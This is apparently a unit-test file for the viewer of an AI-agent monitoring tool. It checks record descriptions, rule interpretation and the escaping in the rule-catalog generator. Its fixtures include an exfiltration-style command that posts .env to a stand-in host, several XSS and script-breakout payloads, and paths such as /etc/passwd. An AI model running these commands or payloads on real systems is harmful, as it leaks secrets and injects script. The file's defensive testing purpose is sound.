#!/usr/bin/env node
//
// Unit tests for the viewer's pure record-description logic.
//
//   node test/viewer-logic.js
//
// The viewer is a single self-contained HTML file with no build step and no
// module system, so there is nothing to import. This lifts the block between
// the [describe:begin] / [describe:end] markers in viewer/viewer.html and
// evaluates it in isolation. That block is required to be self-contained: if
// it ever reaches for the DOM, a global, or a helper defined elsewhere in the
// file, these tests fail loudly rather than silently testing a stub.
//
// All fixtures are generated inline. No temp files, no external data.

"use strict";

var fs = require("fs");
var path = require("path");

var VIEWER = path.join(__dirname, "..", "viewer", "viewer.html");

/* ── extract the pure block ─────────────────────────────────────────────── */

var HTML;
try { HTML = fs.readFileSync(VIEWER, "utf8"); }
catch(e){ bail("cannot read " + VIEWER + " — " + e.message); }

// Lift the source between a pair of /* [name:begin] */ ... /* [name:end] */
// markers. Each marked block is required to be self-contained: if it reaches
// for the DOM, a global, or a helper defined elsewhere in the file, evaluating
// it here fails loudly rather than silently testing a stub.
function blockSrc(name){
  var BEGIN = "/* [" + name + ":begin] */", END = "/* [" + name + ":end] */";
  var a = HTML.indexOf(BEGIN), b = HTML.indexOf(END);
  if(a === -1 || b === -1 || b < a)
    bail("could not find the [" + name + ":begin]/[" + name + ":end] markers in viewer/viewer.html");
  return HTML.slice(a + BEGIN.length, b);
}

function loadBlock(name, wants){
  var src = blockSrc(name);
  for(var i = 0; i < wants.length; i++){
    if(!(new RegExp("(function\\s+" + wants[i] + "\\s*\\(|var\\s+" + wants[i] + "\\s*=)")).test(src))
      bail("the [" + name + "] block does not define " + wants[i]);
  }
  // Sloppy-mode globals would leak here; "use strict" makes that a ReferenceError.
  try {
    return new Function('"use strict";' + src +
                        "\nreturn {" + wants.map(function(w){ return w + ":" + w; }).join(",") + "};")();
  } catch(e){
    bail("the [" + name + "] block failed to evaluate standalone — " + e.message);
  }
}

function bail(msg){
  process.stderr.write("FATAL: " + msg + "\n");
  process.exit(2);
}

var describe  = loadBlock("describe",  ["describe"]).describe;
var interpret = loadBlock("interpret", ["interpret"]).interpret;

var catBlock  = loadBlock("rulecat", ["RULECAT", "RULECAT_META"]);
var RULECAT   = catBlock.RULECAT;
var RULECAT_META = catBlock.RULECAT_META;

/* ── tiny harness ───────────────────────────────────────────────────────── */

var pass = 0, failures = [];

function eq(label, actual, expected){
  if(actual === expected) { pass++; return; }
  failures.push(label + "\n      expected: " + JSON.stringify(expected) +
                        "\n      actual:   " + JSON.stringify(actual));
}
function ok(label, cond, detail){
  if(cond) { pass++; return; }
  failures.push(label + (detail ? "\n      " + detail : ""));
}

/* ── the record types in the spec table ─────────────────────────────────── */

eq("event/command.exec names the command",
   describe({ record_type:"event", event_type:"command.exec", tool_name:"Bash", command:"npm test" }),
   "Ran a shell command: npm test");

eq("event/command.exec falls back to the tool when no command is present",
   describe({ record_type:"event", event_type:"command.exec", tool_name:"Bash" }),
   "Ran a command via Bash");

eq("event/command.exec reads the legacy observed_command field",
   describe({ record_type:"event", event_type:"command.exec", observed_command:"rm -rf /tmp/x" }),
   "Ran a shell command: rm -rf /tmp/x");

eq("event/command.result exit 0 reports success",
   describe({ record_type:"event", event_type:"command.result", exit_code:0 }),
   "Command finished successfully");

eq("event/command.result exit 1 reports the code",
   describe({ record_type:"event", event_type:"command.result", exit_code:1 }),
   "Command failed (exit 1)");

eq("event/command.result exit 137 reports the code",
   describe({ record_type:"event", event_type:"command.result", exit_code:137 }),
   "Command failed (exit 137)");

eq("event/file.read names the file",
   describe({ record_type:"event", event_type:"file.read", file_path:"src/lib/auth.js" }),
   "Read a file: src/lib/auth.js");

eq("event/file.write names the file",
   describe({ record_type:"event", event_type:"file.write", file_path:"src/lib/auth.js" }),
   "Wrote a file: src/lib/auth.js");

eq("event/session.start",
   describe({ record_type:"event", event_type:"session.start" }),
   "Session started");

eq("event/prompt.user",
   describe({ record_type:"event", event_type:"prompt.user" }),
   "Operator sent a prompt");

eq("event/tool.call names an MCP tool",
   describe({ record_type:"event", event_type:"tool.call", tool_name:"mcp__slack__send_message" }),
   "Called the mcp__slack__send_message tool");

eq("event/network.indicator reduces a URL to its host",
   describe({ record_type:"event", event_type:"network.indicator",
              url:"https://evil.example.com/a/b?c=d#e" }),
   "Requested a URL: evil.example.com");

eq("finding pairs title with rule",
   describe({ record_type:"finding", title:"Credential exfiltration chain", rule_id:"chain.exfil.01" }),
   "Credential exfiltration chain — matched chain.exfil.01");

eq("enforcement deny",
   describe({ record_type:"enforcement", decision:"deny", deny_rule_id:"net.egress.block" }),
   "Blocked an action: net.egress.block");

// numbat's real enforcement records use decision:"no_override" with rule_ids[]
// and reason:"monitor_mode" — there is no deny_rule_id outside the spec table.
eq("enforcement in monitor mode says it did not act",
   describe({ record_type:"enforcement", decision:"no_override", mode:"monitor",
              reason:"monitor_mode", rule_ids:["tamper.detector_state_write"] }),
   "Did not intervene (monitor mode): tamper.detector_state_write");

eq("enforcement summarises multiple rule_ids",
   describe({ record_type:"enforcement", decision:"deny", rule_ids:["a.rule","b.rule","c.rule"] }),
   "Blocked an action: a.rule +2 more");

eq("enforcement prefers deny_rule_id when both are present",
   describe({ record_type:"enforcement", decision:"deny",
              deny_rule_id:"net.egress.block", rule_ids:["other.rule"] }),
   "Blocked an action: net.egress.block");

eq("an unknown decision is de-underscored rather than echoed raw",
   describe({ record_type:"enforcement", decision:"soft_warn", reason:"rate_limited" }),
   "Enforcement decision: soft warn: rate limited");

eq("a finding falls back to rule_ids when rule_id is absent",
   describe({ record_type:"finding", title:"Agent targeted numbat's state directory",
              rule_ids:["tamper.detector_state_write"] }),
   "Agent targeted numbat's state directory — matched tamper.detector_state_write");

eq("an empty rule_ids array does not fabricate a rule",
   describe({ record_type:"finding", title:"Something happened", rule_ids:[] }),
   "Something happened");

eq("a rule_ids array of nulls does not fabricate a rule",
   describe({ record_type:"finding", title:"Something happened", rule_ids:[null,null] }),
   "Something happened");

eq("indicator counts occurrences",
   describe({ record_type:"indicator", type:"domain", value:"api.supabase.com", count:3 }),
   "Saw domain api.supabase.com, 3 times");

eq("indicator singularises a count of one",
   describe({ record_type:"indicator", type:"url", value:"https://x.test/y", count:1 }),
   "Saw url https://x.test/y, 1 time");

eq("scan_summary",
   describe({ record_type:"scan_summary", status:"clean" }),
   "Scan finished: clean");

eq("diagnostic surfaces the message",
   describe({ record_type:"diagnostic", level:"warn", message:"state.db locked, retrying" }),
   "state.db locked, retrying");

/* ── duration, since this corpus carries no exit codes ──────────────────── */

eq("command.result with no exit code reports duration instead of guessing",
   describe({ record_type:"event", event_type:"command.result", duration_ms:1019 }),
   "Command finished after 1.0 s");

eq("sub-second duration stays in milliseconds",
   describe({ record_type:"event", event_type:"command.result", duration_ms:43 }),
   "Command finished after 43 ms");

eq("multi-minute duration rounds to minutes",
   describe({ record_type:"event", event_type:"command.result", duration_ms:125000 }),
   "Command finished after 2 min");

eq("command.result with neither exit code nor duration claims nothing",
   describe({ record_type:"event", event_type:"command.result" }),
   "Command finished");

ok("command.result never invents success when there is no exit code",
   describe({ record_type:"event", event_type:"command.result", duration_ms:5 }).indexOf("success") === -1);

/* ── long paths are shortened, not dropped ──────────────────────────────── */

(function(){
  var long = "/Users/someone/.superset/worktrees/8635b301-bd9e-4456-aa67-78f676170d23/" +
             "admin-pages-bug-audit/sh-dashboard/src/middleware.js";
  var out = describe({ record_type:"event", event_type:"file.read", file_path:long });
  eq("a long path collapses to its last two segments", out, "Read a file: …/src/middleware.js");
})();

/* ── degraded, partial and hostile records ──────────────────────────────── */

eq("a record with only record_type still describes itself (finding)",
   describe({ record_type:"finding" }), "Recorded a finding");
eq("a record with only record_type still describes itself (indicator)",
   describe({ record_type:"indicator" }), "Saw an indicator");
eq("a record with only record_type still describes itself (scan_summary)",
   describe({ record_type:"scan_summary" }), "Scan finished");
eq("a record with only record_type still describes itself (enforcement)",
   describe({ record_type:"enforcement" }), "Recorded an enforcement decision");
eq("a record with only record_type still describes itself (diagnostic)",
   describe({ record_type:"diagnostic" }), "Diagnostic record with no message");
eq("an event with no event_type is still honest",
   describe({ record_type:"event" }), "Unrecognized record (event)");

eq("an empty object is named honestly",
   describe({}), "Unrecognized record (no record_type)");

eq("an unknown record_type is echoed back",
   describe({ record_type:"telemetry_blob" }), "Unrecognized record (telemetry_blob)");

eq("an unknown event_type degrades with whatever context exists",
   describe({ record_type:"event", event_type:"file.chmod", file_path:"/etc/passwd" }),
   "Recorded a file.chmod event: /etc/passwd");

eq("all-null fields degrade instead of printing null",
   describe({ record_type:null, event_type:null, tool_name:null, command:null,
              file_path:null, exit_code:null, title:null, rule_id:null,
              value:null, count:null, message:null, status:null, decision:null }),
   "Unrecognized record (no record_type)");

eq("null fields inside a known record type degrade cleanly",
   describe({ record_type:"event", event_type:"command.exec", command:null, tool_name:null }),
   "Ran a shell command");

eq("a non-object is rejected without throwing (null)", describe(null), "Unrecognized record");
eq("a non-object is rejected without throwing (undefined)", describe(undefined), "Unrecognized record");
eq("a non-object is rejected without throwing (array)", describe([1,2,3]), "Unrecognized record");
eq("a non-object is rejected without throwing (string)", describe("hello"), "Unrecognized record");
eq("a non-object is rejected without throwing (number)", describe(42), "Unrecognized record");

eq("object-valued fields never leak [object Object] into the sentence",
   describe({ record_type:"event", event_type:"command.exec", command:{ nested:true } }),
   "Ran a shell command");

eq("whitespace and newlines collapse to a single line",
   describe({ record_type:"event", event_type:"command.exec", command:"npm  test\n\n--watch" }),
   "Ran a shell command: npm test --watch");

/* ── truncation: a 10KB command must not produce a 10KB sentence ────────── */

(function(){
  var huge = "curl " + "A".repeat(10 * 1024);
  var out = describe({ record_type:"event", event_type:"command.exec", command:huge });
  ok("a 10KB command is truncated", out.length < 200,
     "got " + out.length + " chars");
  ok("the truncated command is marked with an ellipsis", out.slice(-1) === "…", JSON.stringify(out.slice(-20)));
  ok("the truncated command keeps its leading context", out.indexOf("Ran a shell command: curl ") === 0);
})();

(function(){
  var hugeTitle = "T".repeat(10 * 1024);
  var out = describe({ record_type:"finding", title:hugeTitle, rule_id:"r.1" });
  ok("a huge finding title is truncated", out.length < 200, "got " + out.length + " chars");
  ok("a truncated finding still names its rule", out.indexOf("matched r.1") !== -1, out);
})();

/* ── invariants across every fixture ────────────────────────────────────── */

var CORPUS = [
  {}, null, undefined, [], "x", 0, true,
  { record_type:"event" },
  { record_type:"event", event_type:"command.exec", command:"ls" },
  { record_type:"event", event_type:"command.result", duration_ms:0 },
  { record_type:"event", event_type:"tool.result", tool_name:"Skill" },
  { record_type:"event", event_type:"session.end" },
  { record_type:"event", event_type:"message.assistant" },
  { record_type:"event", event_type:"file.delete", file_path:"/x" },
  { record_type:"finding" }, { record_type:"enforcement", decision:"allow" },
  { record_type:"indicator", count:0 }, { record_type:"scan_summary" },
  { record_type:"diagnostic" }, { record_type:"zzz" },
  { record_type:"event", event_type:"network.indicator" },
  { record_type:"event", event_type:"command.result", exit_code:-9 },
  { record_type:"indicator", type:"domain", value:"a.test", count:1.5 },
  { record_type:"event", event_type:"command.exec", command:"" },
  { record_type:"event", event_type:"file.read", file_path:"" }
];

CORPUS.forEach(function(rec, i){
  var out;
  try { out = describe(rec); }
  catch(e){ failures.push("describe() threw on corpus[" + i + "]: " + e.message); return; }
  ok("corpus[" + i + "] returns a string", typeof out === "string", "got " + typeof out);
  ok("corpus[" + i + "] is never empty", typeof out === "string" && out.trim().length > 0,
     JSON.stringify(out));
  ok("corpus[" + i + "] is never 'undefined'/'null' text",
     typeof out === "string" && out.indexOf("undefined") === -1 && out.indexOf("[object") === -1,
     JSON.stringify(out));
});

/* ── purity ─────────────────────────────────────────────────────────────── */

(function(){
  var rec = { record_type:"event", event_type:"command.exec", command:"npm test", tool_name:"Bash" };
  var snapshot = JSON.stringify(rec);
  var first = describe(rec);
  ok("describe() does not mutate its argument", JSON.stringify(rec) === snapshot);
  eq("describe() is deterministic", describe(rec), first);

  var frozen = Object.freeze({ record_type:"finding", title:"t", rule_id:"r" });
  eq("describe() works on a frozen record", describe(frozen), "t — matched r");
})();

ok("describe() runs with no DOM present", typeof globalThis.document === "undefined");

/* ── escaping is the caller's job; describe must pass text through intact ── */

(function(){
  var xss = '<img src=x onerror=alert(1)>';
  var out = describe({ record_type:"event", event_type:"command.exec", command:"echo " + xss });
  ok("describe() returns markup verbatim so esc() remains the single escape point",
     out.indexOf(xss) !== -1, out);
  ok("describe() does not pre-escape (that would double-escape in the row)",
     out.indexOf("&lt;") === -1, out);
})();

/* ── the embedded rule catalog ──────────────────────────────────────────── */

var RULE_IDS = Object.keys(RULECAT);

ok("the catalog is not empty", RULE_IDS.length > 0, "got " + RULE_IDS.length);
ok("the catalog records the numbat commit it was generated from",
   /^[0-9a-f]{40}$/.test(String(RULECAT_META.sha)), JSON.stringify(RULECAT_META.sha));
eq("the metadata rule count matches the catalog", RULECAT_META.rules, RULE_IDS.length);

(function(){
  var bad = [];
  RULE_IDS.forEach(function(id){
    var r = RULECAT[id];
    if(!r || typeof r !== "object"){ bad.push(id + ": not an object"); return; }
    ["v","sev","kind","t","d"].forEach(function(k){
      if(typeof r[k] !== "string" || !r[k].trim()) bad.push(id + ": missing " + k);
    });
    if(r.kind !== "expr" && r.kind !== "sequence") bad.push(id + ": bad kind " + r.kind);
    if(!Array.isArray(r.g)) bad.push(id + ": tags not an array");
  });
  ok("every catalog entry carries the fields interpret() relies on",
     bad.length === 0, bad.slice(0, 5).join("; "));
})();

// The catalog is executable JavaScript inside a <script> element. These are the
// sequences that would let rule text escape its string literal.
(function(){
  var raw = blockSrc("rulecat");
  ok("the generated catalog contains no raw </script", raw.indexOf("</script") === -1);
  ok("the generated catalog contains no raw <!--", raw.indexOf("<!--") === -1);
  ok("the generated catalog contains no raw U+2028/U+2029",
     !(new RegExp("[" + String.fromCharCode(0x2028) + String.fromCharCode(0x2029) + "]")).test(raw));
})();

/* ── interpret(): fixtures are built FROM the catalog ───────────────────────
 *
 * Hand-written rule metadata would let the catalog and these tests drift apart,
 * so a regeneration that changes a description would fail nothing. Every
 * fixture below reads its rule's real version, severity and text out of
 * RULECAT.
 */

function findingFor(id, over){
  var r = RULECAT[id];
  var f = { record_type:"finding", rule_id:id, rule_version:r.v, title:r.t,
            severity:r.sev, confidence:"medium", source_type:"hook",
            observed_event_type:"command.exec", observed_actor:"assistant",
            observed_command:"echo hi", redacted:false };
  if(over) Object.keys(over).forEach(function(k){ f[k] = over[k]; });
  return f;
}

var EXPR_ID = RULE_IDS.filter(function(i){ return RULECAT[i].kind === "expr"; })[0];
var SEQ_ID  = RULE_IDS.filter(function(i){ return RULECAT[i].kind === "sequence"; })[0];

ok("the catalog contains at least one single-event rule", !!EXPR_ID);
ok("the catalog contains at least one chain rule", !!SEQ_ID);

eq("interpret() declines an event", interpret({ record_type:"event", event_type:"command.exec" }, RULECAT), null);
eq("interpret() declines an indicator", interpret({ record_type:"indicator" }, RULECAT), null);
eq("interpret() declines an enforcement record", interpret({ record_type:"enforcement", decision:"deny" }, RULECAT), null);

(function(){
  var bad = [];
  RULE_IDS.forEach(function(id){
    var ip = interpret(findingFor(id), RULECAT);
    if(!ip){ bad.push(id + ": null"); return; }
    if(!ip.looksFor){ bad.push(id + ": no description"); return; }
    if(ip.looksFor.stale) bad.push(id + ": stale against its own version");
    if(ip.looksFor.text !== RULECAT[id].d.slice(0, ip.looksFor.text.length).replace(/…$/, "") &&
       ip.looksFor.text.indexOf(RULECAT[id].d.slice(0, 40)) !== 0)
      bad.push(id + ": description does not come from the catalog");
  });
  ok("every catalog rule interprets at its own version with no staleness flag",
     bad.length === 0, bad.slice(0, 5).join("; "));
})();

(function(){
  var ip = interpret(findingFor(EXPR_ID, { rule_version: RULECAT[EXPR_ID].v + ".9" }), RULECAT);
  ok("a version mismatch is flagged stale", ip.looksFor.stale === true);
  eq("the stale marker reports the catalog's version", ip.looksFor.catV, RULECAT[EXPR_ID].v);
  eq("the stale marker reports the record's version", ip.looksFor.recV, RULECAT[EXPR_ID].v + ".9");
  ok("the description is still shown when stale", ip.looksFor.text.length > 0);
})();

// The real day-one case: ~/numbat-policy ships a same-id override of
// tamper.guardrails_off at version 99.0, which no generated catalog can match.
(function(){
  var id = "tamper.guardrails_off";
  if(!Object.prototype.hasOwnProperty.call(RULECAT, id)){
    failures.push("expected " + id + " in the catalog — the day-one staleness case is untested");
    return;
  }
  var ip = interpret(findingFor(id, { rule_version:"99.0" }), RULECAT);
  ok("the numbat-policy 99.0 override is flagged stale", ip.looksFor.stale === true);
  eq("it reports the record's version", ip.looksFor.recV, "99.0");
  ok("it does not claim the catalog is at 99.0", ip.looksFor.catV !== "99.0");
})();

(function(){
  var ip = interpret({ record_type:"finding", rule_id:"operator.custom_thing",
                       rule_version:"2.0", title:"Custom", severity:"high" }, RULECAT);
  eq("an uncatalogued rule yields no description", ip.looksFor, null);
  ok("an uncatalogued rule says so", ip.limits.join(" ").indexOf("not in this viewer's catalog") !== -1,
     JSON.stringify(ip.limits));
  ok("an uncatalogued rule makes no claim about how it matches",
     ip.whyFired.text.indexOf("cannot be shown") !== -1, ip.whyFired.text);
})();

/* the closed condition set */

(function(){
  var ip = interpret(findingFor(EXPR_ID), RULECAT);
  ok("a live hook command.exec says numbat saw it before it ran",
     ip.limits.join(" ").indexOf("before it ran") !== -1, JSON.stringify(ip.limits));
})();

// file.write arrives from both the pre- and post-tool hook, so it establishes
// no ordering and must not carry a pre-action claim.
(function(){
  var ip = interpret(findingFor(EXPR_ID, { observed_event_type:"file.write" }), RULECAT);
  ok("a hook file.write makes no pre-action claim",
     ip.limits.join(" ").indexOf("before it ran") === -1, JSON.stringify(ip.limits));
})();
(function(){
  var ip = interpret(findingFor(EXPR_ID, { observed_event_type:"file.delete" }), RULECAT);
  ok("a hook file.delete makes no pre-action claim",
     ip.limits.join(" ").indexOf("before it ran") === -1, JSON.stringify(ip.limits));
})();

// An at-rest scan finding is reconstructed after the fact and carries no
// pre-action claim at all.
(function(){
  var ip = interpret(findingFor(EXPR_ID, { source_type:"artifact" }), RULECAT);
  ok("an at-rest artifact finding never claims numbat saw it first",
     ip.limits.join(" ").indexOf("before it ran") === -1, JSON.stringify(ip.limits));
  ok("an at-rest artifact finding says it was reconstructed",
     ip.limits.join(" ").indexOf("Reconstructed") !== -1, JSON.stringify(ip.limits));
})();
(function(){
  var ip = interpret(findingFor(EXPR_ID, { source_type:"otel" }), RULECAT);
  ok("an otel finding never claims numbat saw it first",
     ip.limits.join(" ").indexOf("saw this before it ran") === -1, JSON.stringify(ip.limits));
})();

(function(){
  var a = interpret(findingFor(EXPR_ID, { observed_actor:"assistant" }), RULECAT);
  var u = interpret(findingFor(EXPR_ID, { observed_actor:"user" }), RULECAT);
  var s = interpret(findingFor(EXPR_ID, { observed_actor:"system" }), RULECAT);
  var n = interpret(findingFor(EXPR_ID, { observed_actor:undefined }), RULECAT);
  // numbat stamps hook and otel events as actor "assistant" by construction
  // (hook.go:995), so the record establishes that the agent issued the call —
  // not that the operator did not ask for it.
  ok("an assistant actor says the agent issued it",
     a.limits.join(" ").indexOf("issued this as a tool call") !== -1, JSON.stringify(a.limits));
  ok("an assistant actor does not deny operator involvement",
     a.limits.join(" ").indexOf("may still have asked for it") !== -1, JSON.stringify(a.limits));
  ok("a user actor attributes it to the operator",
     u.limits.join(" ").indexOf("came from the operator") !== -1, JSON.stringify(u.limits));
  ok("a system actor claims neither", s.limits.join(" ").indexOf("operator") === -1, JSON.stringify(s.limits));
  ok("an absent actor claims neither", n.limits.join(" ").indexOf("operator") === -1, JSON.stringify(n.limits));
})();

(function(){
  var ip = interpret(findingFor(SEQ_ID), RULECAT);
  ok("a chain rule says it correlated several events",
     ip.whyFired.text.indexOf("chain rule matched") !== -1, ip.whyFired.text);
  ok("a chain rule disclaims data flow between steps",
     ip.limits.join(" ").indexOf("not that data from an earlier step") !== -1, JSON.stringify(ip.limits));
  // What numbat establishes is the order it OBSERVED events in, which is a
  // hair weaker than the order they occurred in.
  ok("a chain rule claims observed order, not actual order",
     ip.limits.join(" ").indexOf("numbat observed the steps in that order") !== -1, JSON.stringify(ip.limits));
  // observed_* on a chain finding is the completing event only (finding.go:83).
  ok("a chain finding marks its observed value as the final step",
     ip.sawHere.finalStep === true);
  ok("a single-event finding does not claim a final step",
     interpret(findingFor(EXPR_ID), RULECAT).sawHere.finalStep === false);
  ok("a chain rule does not imply the whole chain was caught before running",
     ip.limits.join(" ").indexOf("earlier steps in the chain had already happened") !== -1,
     JSON.stringify(ip.limits));
  var single = interpret(findingFor(EXPR_ID), RULECAT);
  ok("a single-event rule says so", single.whyFired.text.indexOf("A single event matched") !== -1);
  ok("a single-event rule makes no chain disclaimer",
     single.limits.join(" ").indexOf("earlier step") === -1);
})();

// numbat defines confidence as how DIRECTLY evidence supports the observation
// (event.go:104), not as certainty that the rule matched — rule evaluation is
// exact CEL. Claiming match-uncertainty would misstate the schema's most
// misread field, on every finding.
(function(){
  var ip = interpret(findingFor(EXPR_ID, { confidence:"medium" }), RULECAT);
  var joined = ip.limits.join(" ");
  ok("confidence is explained as evidentiary directness",
     joined.indexOf("how directly evidence backs the observation") !== -1, JSON.stringify(ip.limits));
  ok("confidence is not described as uncertainty about the match",
     joined.indexOf("how sure numbat is that it matched") === -1, JSON.stringify(ip.limits));
  ok("the rule match is stated to be exact", joined.indexOf("the rule matched exactly") !== -1);
  ok("confidence is still distinguished from risk", joined.indexOf("not the risk") !== -1);
  var none = interpret(findingFor(EXPR_ID, { confidence:undefined }), RULECAT);
  ok("an absent confidence produces no confidence caveat",
     none.limits.join(" ").indexOf("how directly evidence") === -1, JSON.stringify(none.limits));
})();

(function(){
  var yes = interpret(findingFor(EXPR_ID, { redacted:true }), RULECAT);
  var no  = interpret(findingFor(EXPR_ID, { redacted:false }), RULECAT);
  ok("a redacted finding says a value was masked",
     yes.limits.join(" ").indexOf("masked before the record was written") !== -1);
  ok("redacted:false claims no masking", no.limits.join(" ").indexOf("masked") === -1);
  // `redacted` reports that at least one field was masked (finding.go:72), not
  // that the displayed one was — so it must not be pinned to the shown value.
  ok("the masking notice does not claim the shown value was the masked one",
     yes.limits.join(" ").indexOf("not necessarily the one shown above") !== -1,
     JSON.stringify(yes.limits));
  ok("no per-value masked marker is attached to the observed text",
     yes.sawHere.redacted === undefined, JSON.stringify(yes.sawHere));
})();

/* what it saw */

(function(){
  var ip = interpret(findingFor(EXPR_ID, { observed_command:"curl https://x.test -d @.env" }), RULECAT);
  eq("the observed command is shown", ip.sawHere.text, "curl https://x.test -d @.env");

  var f = interpret(findingFor(EXPR_ID, { observed_command:undefined, observed_file_path:"/etc/passwd" }), RULECAT);
  eq("a file path is used when there is no command", f.sawHere.text, "/etc/passwd");

  var m = interpret(findingFor(EXPR_ID, { observed_command:undefined,
                                          observed_mcp_server:"github", observed_mcp_tool:"create_issue" }), RULECAT);
  eq("an MCP call is named", m.sawHere.text, "github · create_issue");

  var none = interpret({ record_type:"finding", rule_id:EXPR_ID, rule_version:RULECAT[EXPR_ID].v }, RULECAT);
  eq("nothing observed yields no 'saw here' line", none.sawHere, null);
})();

(function(){
  var huge = "curl " + "A".repeat(10 * 1024);
  var ip = interpret(findingFor(EXPR_ID, { observed_command:huge }), RULECAT);
  ok("a 10KB observed command is truncated", ip.sawHere.text.length < 400, "got " + ip.sawHere.text.length);
  ok("the truncation is marked", ip.sawHere.text.slice(-1) === "…");
  var bad = [];
  RULE_IDS.forEach(function(id){
    var t = interpret(findingFor(id), RULECAT).looksFor.text;
    if(t.length > 430) bad.push(id + ": " + t.length);
  });
  ok("no catalog description renders unbounded", bad.length === 0, bad.join("; "));
})();

/* degraded and hostile input */

(function(){
  var hostile = [ null, undefined, [], "x", 42, true, {},
                  { record_type:"finding" },
                  { record_type:"finding", rule_id:null, rule_ids:null },
                  { record_type:"finding", rule_ids:[] },
                  { record_type:"finding", rule_ids:[null, null] },
                  { record_type:"finding", rule_id:{ nested:true } },
                  { record_type:"finding", rule_id:EXPR_ID, rule_version:{ a:1 } },
                  { record_type:"finding", rule_id:EXPR_ID, observed_command:{ a:1 } },
                  { record_type:"finding", rule_id:EXPR_ID, confidence:[1,2] } ];

  hostile.forEach(function(rec, i){
    var ip;
    try { ip = interpret(rec, RULECAT); }
    catch(e){ failures.push("interpret() threw on hostile[" + i + "]: " + e.message); return; }
    if(ip === null){ pass++; return; }
    ok("hostile[" + i + "] returns limits as an array", Array.isArray(ip.limits));
    ok("hostile[" + i + "] returns a why string", typeof ip.whyFired.text === "string" && ip.whyFired.text.length > 0);
    var all = JSON.stringify(ip);
    ok("hostile[" + i + "] leaks no undefined/[object", all.indexOf("undefined") === -1 && all.indexOf("[object") === -1, all.slice(0, 160));
  });
})();

(function(){
  var f = findingFor(EXPR_ID);
  ok("interpret() tolerates a missing catalog", interpret(f, undefined) !== null);
  eq("with no catalog there is no description", interpret(f, undefined).looksFor, null);
  ok("interpret() tolerates a non-object catalog", interpret(f, "nope") !== null);
  ok("interpret() tolerates an array catalog", interpret(f, [1,2]) !== null);
  ok("a catalog entry that is not an object is ignored",
     interpret(f, (function(){ var c = {}; c[EXPR_ID] = "nope"; return c; })()).looksFor === null);
})();

/* purity and the escaping contract */

(function(){
  var rec = findingFor(EXPR_ID);
  var snapshot = JSON.stringify(rec);
  var first = JSON.stringify(interpret(rec, RULECAT));
  ok("interpret() does not mutate its argument", JSON.stringify(rec) === snapshot);
  eq("interpret() is deterministic", JSON.stringify(interpret(rec, RULECAT)), first);
  ok("interpret() works on a frozen record", interpret(Object.freeze(findingFor(EXPR_ID)), RULECAT) !== null);
  ok("interpret() runs with no DOM present", typeof globalThis.document === "undefined");
})();

(function(){
  var xss = '<img src=x onerror=alert(1)>';
  var ip = interpret(findingFor(EXPR_ID, { observed_command:"echo " + xss }), RULECAT);
  ok("interpret() returns markup verbatim so esc() stays the single escape point",
     ip.sawHere.text.indexOf(xss) !== -1, ip.sawHere.text);
  ok("interpret() does not pre-escape", ip.sawHere.text.indexOf("&lt;") === -1);
})();

/* ── the generator's injection defences ─────────────────────────────────────
 *
 * Called directly rather than through a temp rules directory: the escaping is
 * the security boundary, so it is tested as a unit.
 */

var gen = require(path.join(__dirname, "..", "tools", "gen-rule-catalog.js"));

(function(){
  var LS = String.fromCharCode(0x2028), PS = String.fromCharCode(0x2029);
  var cases = [
    '</script><script>alert(1)</script>',
    '<!-- <script> -->',
    'back`tick and ${interpolation}',
    'quote " and backslash \\ and newline \n',
    'line' + LS + 'sep' + PS + 'end',
    '  control chars'
  ];
  cases.forEach(function(s, i){
    var out = gen.jsonSafe(s);
    ok("jsonSafe[" + i + "] emits no raw </script", out.indexOf("</script") === -1, out);
    ok("jsonSafe[" + i + "] emits no raw <!--", out.indexOf("<!--") === -1, out);
    ok("jsonSafe[" + i + "] emits no raw line terminator",
       out.indexOf(LS) === -1 && out.indexOf(PS) === -1);
    var back;
    try { back = JSON.parse(out); }
    catch(e){ failures.push("jsonSafe[" + i + "] did not emit valid JSON: " + e.message); return; }
    eq("jsonSafe[" + i + "] round-trips exactly", back, s);
  });
})();

// A deliberately hostile rule file must not be able to inject script.
(function(){
  var yaml = [
    'id: evil.injection',
    'version: "1.0"',
    'enabled: true',
    'title: Evil rule',
    'description: |-',
    '  </script><script>alert(document.domain)</script>',
    '  and a backtick ` and ${x}',
    'severity: high',
    'tags: [evil]'
  ].join("\n");

  var r = gen.parseRuleYAML(yaml);
  eq("the hostile rule still parses its id", r.id, "evil.injection");
  ok("the hostile description is captured", r.description.indexOf("alert(document.domain)") !== -1);

  var rules = { "evil.injection": { v:r.version, sev:r.severity, kind:"expr",
                                    t:r.title, d:r.description, g:r.tags } };
  var meta  = { source:"/fixture", sha:"0".repeat(40), release:"fixture", rules:1 };
  var block = gen.renderBlock(meta, rules);

  ok("a hostile rule cannot close the script element", block.indexOf("</script") === -1);
  ok("a hostile rule cannot open an HTML comment", block.indexOf("<!--") === -1);
  eq("the emitted block passes the generator's own round-trip check",
     gen.verifyRoundTrip(block, meta, rules), null);

  // and it still evaluates to the original text
  var got = new Function('"use strict";' + block.replace(gen.BEGIN, "") .replace(gen.END, "") +
                         "\nreturn RULECAT;")();
  eq("the hostile description survives escaping intact",
     got["evil.injection"].d, r.description);
})();

(function(){
  var r = gen.parseRuleYAML([
    'id: chain.example', 'version: "2.0"', 'title: Chained', 'description: |-',
    '  first line', '  second line', 'severity: medium', 'sequence:',
    '  within_events: 64', '  steps:', '    - expr: |-', '        whatever'
  ].join("\n"));
  eq("a block scalar folds to one line", r.description, "first line second line");
  ok("a top-level sequence key is detected",
     Object.prototype.hasOwnProperty.call(r, "sequence"));
  eq("nested keys under sequence are not hoisted", r.within_events, undefined);
  eq("a quoted version keeps its value", r.version, "2.0");
})();

// A description that spells one of this file's own markers would sit inertly
// in the emitted JSON on run 1, then splice the block on run 2 and leave stray
// tokens in the viewer's only <script>. Escaping `*` makes the marker
// unspellable; the marker-count check is the backstop.
(function(){
  var evil = "text containing " + gen.END + " inside it";
  var rules = { "evil.marker": { v:"1.0", sev:"high", kind:"expr", t:"T", d:evil, g:[] } };
  var meta  = { source:"/fixture", sha:"0".repeat(40), release:"fixture", rules:1 };
  var block = gen.renderBlock(meta, rules);

  eq("a rule description cannot spell the end marker",
     block.indexOf(gen.END), block.lastIndexOf(gen.END));
  eq("a rule description cannot spell the begin marker",
     block.indexOf(gen.BEGIN), block.lastIndexOf(gen.BEGIN));
  eq("the marker-bearing rule still passes the round-trip check",
     gen.verifyRoundTrip(block, meta, rules), null);

  var got = new Function('"use strict";' + block.replace(gen.BEGIN, "").replace(gen.END, "") +
                         "\nreturn RULECAT;")();
  eq("the marker text survives escaping intact", got["evil.marker"].d, evil);

  // and splicing the emitted block back out must be unambiguous
